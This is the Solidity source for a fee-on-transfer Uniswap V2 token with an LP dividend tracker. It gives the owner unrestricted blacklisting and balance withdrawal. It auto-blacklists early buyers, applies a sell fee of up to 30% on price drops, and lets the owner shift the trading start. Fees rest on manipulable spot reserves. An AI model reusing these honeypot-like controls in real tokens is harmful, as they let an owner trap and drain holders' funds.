// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract TokenDividendTracker is Ownable {
    using SafeMath for uint256;

    address[] public shareholders;
    uint256 public currentIndex;
    mapping(address => bool) private _updated;
    mapping(address => uint256) public shareholderIndexes;

    address public uniswapV2Pair;
    address public lpRewardToken;
    uint256 public LPRewardLastSendTime;

    constructor(address uniswapV2Pair_, address lpRewardToken_) {
        uniswapV2Pair = uniswapV2Pair_;
        lpRewardToken = lpRewardToken_;
    }

    function resetLPRewardLastSendTime() public onlyOwner {
        LPRewardLastSendTime = 0;
    }

    function process(uint256 gas) external onlyOwner {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) return;
        uint256 nowbanance = IERC20(lpRewardToken).balanceOf(address(this));

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
                LPRewardLastSendTime = block.timestamp;
                return;
            }
            uint256 amount = nowbanance
                .mul(
                    IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex])
                )
                .div(IERC20(uniswapV2Pair).totalSupply());
            if (amount == 0) {
                currentIndex++;
                iterations++;
                return;
            }
            if (IERC20(lpRewardToken).balanceOf(address(this)) < amount) return;
            IERC20(lpRewardToken).transfer(shareholders[currentIndex], amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function setShare(address shareholder) external onlyOwner {
        if (_updated[shareholder]) {
            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0)
                quitShare(shareholder);
            return;
        }
        if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;
        addShareholder(shareholder);
        _updated[shareholder] = true;
    }

    function quitShare(address shareholder) internal {
        removeShareholder(shareholder);
        _updated[shareholder] = false;
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract Wrap {
    IERC20 public ft;
    IERC20 public usdt;

    constructor(IERC20 ft_, IERC20 usdt_) {
        ft = ft_;
        usdt = usdt_;
    }

    function withdraw() external {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdt.transfer(address(ft), usdtBalance);
        }
    }
}

contract FTTokenV2 is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    IERC20 public immutable usdt;
    TokenDividendTracker public immutable dividendTracker;
    Wrap public immutable wrap;

    bool private _swapping;
    uint256 private _lastSwapTime;
    uint256 public immutable lpRewardFee = 1;
    uint256 public AmountLpRewardFee;
    uint256 public AmountLpFee;
    uint256 public immutable marketingFee = 1;
    uint256 public immutable sellBurnFee = 2;
    address public immutable burnAddress =
        0x000000000000000000000000000000000000dEaD;
    uint256 public immutable maxBurn;

    address private _fromAddress;
    address private _toAddress;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isDividendExempt;
    mapping(address => bool) private _blacklist;
    mapping(uint256 => uint256) private _todayBasePrices;

    uint256 public minPeriod = 1 days;
    uint256 public distributorGas = 200000;

    uint256 public maxHold = 1e18;
    uint256 public swapStartTime;
    address public marketingAddress;
    address public lpReceiveAddress;
    uint256 public swapInterval = 4 hours;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetBlacklist(address indexed account, bool isExcluded);
    event BatchSetBlacklist(address[] accounts, bool isExcluded);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 usdtReceived,
        uint256 tokensIntoLiqudity
    );

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        IUniswapV2Router02 uniswapV2Router_,
        IERC20 usdt_,
        address marketingAddress_,
        uint256 maxBurn_,
        uint256 swapStartTime_
    ) payable ERC20(name_, symbol_) {
        uint256 totalSupply = totalSupply_ * 10 ** decimals();
        uniswapV2Router = uniswapV2Router_;
        usdt = usdt_;
        maxBurn = maxBurn_ * 10 ** decimals();
        swapStartTime = swapStartTime_;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                address(usdt)
            );
        dividendTracker = new TokenDividendTracker(
            uniswapV2Pair,
            address(usdt)
        );
        wrap = new Wrap(IERC20(this), usdt);
        lpReceiveAddress = marketingAddress = marketingAddress_;
        excludeFromFees(owner(), true);
        excludeFromFees(marketingAddress, true);
        excludeFromFees(burnAddress, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(dividendTracker), true);
        _isDividendExempt[burnAddress] = true;
        _isDividendExempt[address(this)] = true;
        _isDividendExempt[address(0)] = true;
        _isDividendExempt[address(dividendTracker)] = true;
        _mint(owner(), totalSupply);
    }

    receive() external payable {}

    function isExcludedFromFees(address account) external view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function isBlacklist(address _address) public view returns (bool) {
        return _blacklist[_address];
    }

    function getTodayBasePrice(uint256 _k) external view returns(uint256){
        return _todayBasePrices[_k];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        require(!isBlacklist(from) && !isBlacklist(to), "Is blacklist");
        require(_isSwap(from, to), "Not swap");
        _deliveryCurrentProce();
        if (_shouldBan(from, to)) {
            _setBlacklist(to, true);
        }
        if (_isSwapFee(from, to)) {
            _swapFee();
        }
        if (_isTakeFee(from, to)) {
            if (from != uniswapV2Pair) {
                uint256 minHolderAmount = balanceOf(from).mul(99).div(100);
                if (amount > minHolderAmount) {
                    amount = minHolderAmount;
                }
            }
            amount = _takeFee(from, amount);
        }
        super._transfer(from, to, amount);
        require(!_isGtMaxHold(from, to), "GT max hold");
        if (_fromAddress == address(0)) _fromAddress = from;
        if (_toAddress == address(0)) _toAddress = to;
        if (!_isDividendExempt[_fromAddress] && _fromAddress != uniswapV2Pair)
            try dividendTracker.setShare(_fromAddress) {} catch {}
        if (!_isDividendExempt[_toAddress] && _toAddress != uniswapV2Pair)
            try dividendTracker.setShare(_toAddress) {} catch {}
        _fromAddress = from;
        _toAddress = to;
        if (
            !_swapping &&
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            dividendTracker.LPRewardLastSendTime().add(minPeriod) <=
            block.timestamp
        ) {
            try dividendTracker.process(distributorGas) {} catch {}
        }
    }

    function _isSwap(address _from, address _to) private view returns (bool) {
        return
            swapStartTime < block.timestamp ||
            (_from != uniswapV2Pair && _to != uniswapV2Pair) ||
            (_isExcludedFromFees[_to] || _isExcludedFromFees[_from]);
    }

    function _isGtMaxHold(address _from, address _to)
        private
        view
        returns (bool)
    {
        return
            block.timestamp < swapStartTime.add(1 days) &&
            _to != uniswapV2Pair && 
            balanceOf(_to) > maxHold &&
            !(_isExcludedFromFees[_to] || _isExcludedFromFees[_from]);
    }

    function _shouldBan(address _from, address _to)
        private
        view
        returns (bool)
    {
        uint256 current = block.timestamp;
        return
            _from == uniswapV2Pair &&
            !_isExcludedFromFees[_to] &&
            current >= swapStartTime &&
            current < swapStartTime.add(10 minutes);
    }

    function _isTakeFee(address _from, address _to)
        private
        view
        returns (bool)
    {
        if (
            _isExcludedFromFees[_from] ||
            _isExcludedFromFees[_to] ||
            (_from != uniswapV2Pair && _to != uniswapV2Pair) ||
            _swapping
        ) {
            return false;
        }
        return true;
    }

    function _isSwapFee(address _from, address _to)
        private
        view
        returns (bool)
    {
        return
            !_swapping &&
            _from != uniswapV2Pair &&
            _from != owner() &&
            _to != owner() &&
            block.timestamp >= (_lastSwapTime + swapInterval);
    }

    function _swapFee() private {
        _swapping = true;
        if (AmountLpRewardFee > 0) {
            _swapTokensForUsdt(AmountLpRewardFee, address(dividendTracker));
            AmountLpRewardFee = 0;
        }
        if (AmountLpFee > 0) {
            _swapAndLiquify(AmountLpFee);
            AmountLpFee = 0;
        }
        _lastSwapTime = block.timestamp;
        _swapping = false;
    }

    function _takeFee(address _from, uint256 _amount)
        private
        returns (uint256 amountAfter)
    {
        amountAfter = _amount;
        uint256 mfee = marketingFee;
        if (_from != uniswapV2Pair) {
            mfee = _getSellMarketingFee();
            uint256 BFee = _amount.mul(sellBurnFee).div(100);
            uint256 isBurn = balanceOf(burnAddress);
            if (isBurn >= maxBurn) BFee = 0;
            if (BFee > 0 && isBurn.add(BFee) > maxBurn)
                BFee = maxBurn.sub(isBurn);
            if (BFee > 0) super._transfer(_from, burnAddress, BFee);
            amountAfter = amountAfter.sub(BFee);
        }
        uint256 LPFee;
        if (mfee > marketingFee) {
            LPFee = _amount.mul(mfee).div(100);
            AmountLpFee = AmountLpFee.add(LPFee);
        } else {
            uint256 MFee = _amount.mul(mfee).div(100);
            if (MFee > 0) super._transfer(_from, marketingAddress, MFee);
            amountAfter = amountAfter.sub(MFee);
        }
        uint256 LPRFee = _amount.mul(lpRewardFee).div(100);
        AmountLpRewardFee = AmountLpRewardFee.add(LPRFee);
        uint256 TFee = LPRFee.add(LPFee);
        if (TFee > 0) super._transfer(_from, address(this), TFee);
        amountAfter = amountAfter.sub(TFee);
    }

    function _getCurrentPrice() private view returns (uint256) {
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(uniswapV2Pair)
            .getReserves();
        if (r0 > 0 && r1 > 0) {
            if (address(this) == IUniswapV2Pair(uniswapV2Pair).token0()) {
                return (r1 * 10**18) / r0;
            } else {
                return (r0 * 10**18) / r1;
            }
        }
        return 0;
    }

    function _deliveryCurrentProce() private {
        uint256 price = _getCurrentPrice();
        uint256 zero = (block.timestamp / 1 days) * 1 days;
        _todayBasePrices[zero] = price;
        if (_todayBasePrices[zero - 1 days] == 0) {
            _todayBasePrices[zero - 1 days] = price;
        }
    }

    function _getSellMarketingFee() private view returns (uint256) {
        uint256 price = _getCurrentPrice();
        uint256 base = _todayBasePrices[
            ((block.timestamp / 1 days) * 1 days) - 1 days
        ];
        if (price >= base) return marketingFee;
        uint256 rate = ((base - price) * 100) / base;
        if (rate >= 30) {
            return 30;
        }
        if (rate >= 20) {
            return 20;
        }
        if (rate >= 10) {
            return 10;
        }
        return marketingFee;
    }

    function _swapAndLiquify(uint256 tokenAmount) private {
        uint256 half = tokenAmount.div(2);
        uint256 otherHalf = tokenAmount.sub(half);
        uint256 newBalance = _swapTokensForUsdt(half, address(wrap));
        _addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function _swapTokensForUsdt(uint256 tokenAmount, address _to)
        private
        returns (uint256 amount)
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdt);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uint256 before = usdt.balanceOf(address(this));
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _to,
            block.timestamp
        );
        if (_to == address(wrap)) {
            wrap.withdraw();
        }
        return usdt.balanceOf(address(this)).sub(before);
    }

    function _addLiquidity(uint256 tokenAmount, uint256 usdtAmount) private {
        usdt.approve(address(uniswapV2Router), usdtAmount);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidity(
            address(this),
            address(usdt),
            tokenAmount,
            usdtAmount,
            0,
            0,
            lpReceiveAddress,
            block.timestamp
        );
    }

    function _setBlacklist(address _address, bool _v) private {
        if (_blacklist[_address] != _v) {
            _blacklist[_address] = _v;
            emit SetBlacklist(_address, _v);
        }
    }

    function withdraw(address _token, address payable _to) external onlyOwner {
        if (_token == address(0x0)) {
            payable(_to).transfer(address(this).balance);
        } else {
            IERC20(_token).transfer(
                _to,
                IERC20(_token).balanceOf(address(this))
            );
        }
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        if (_isExcludedFromFees[account] != excluded) {
            _isExcludedFromFees[account] = excluded;
            emit ExcludeFromFees(account, excluded);
        }
    }

    function setBlacklist(address _address, bool _v) external onlyOwner {
        _setBlacklist(_address, _v);
    }

    function excludeMultipleAccountsFromFees(
        address[] calldata accounts,
        bool excluded
    ) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function batchSetBlacklist(address[] calldata accounts, bool _v)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _blacklist[accounts[i]] = _v;
        }
        emit BatchSetBlacklist(accounts, _v);
    }

    function setMinPeriod(uint256 number) external onlyOwner {
        minPeriod = number;
    }

    function setSwapInterval(uint256 _interval) external onlyOwner {
        swapInterval = _interval;
    }

    function setMarketingAddress(address _address) external onlyOwner {
        marketingAddress = _address;
    }

    function setLpReceiveAddress(address _address) external onlyOwner {
        lpReceiveAddress = _address;
    }

    function resetLPRewardLastSendTime() external onlyOwner {
        dividendTracker.resetLPRewardLastSendTime();
    }

    function setMaxHold(uint256 _v) external onlyOwner {
        maxHold = _v;
    }

    function setSwapStartTime(uint256 _time) external onlyOwner {
        swapStartTime = _time;
    }

    function updateDistributorGas(uint256 newValue) external onlyOwner {
        require(
            newValue >= 100000 && newValue <= 500000,
            "distributorGas must be between 200,000 and 500,000"
        );
        require(
            newValue != distributorGas,
            "Cannot update distributorGas to same value"
        );
        distributorGas = newValue;
    }
}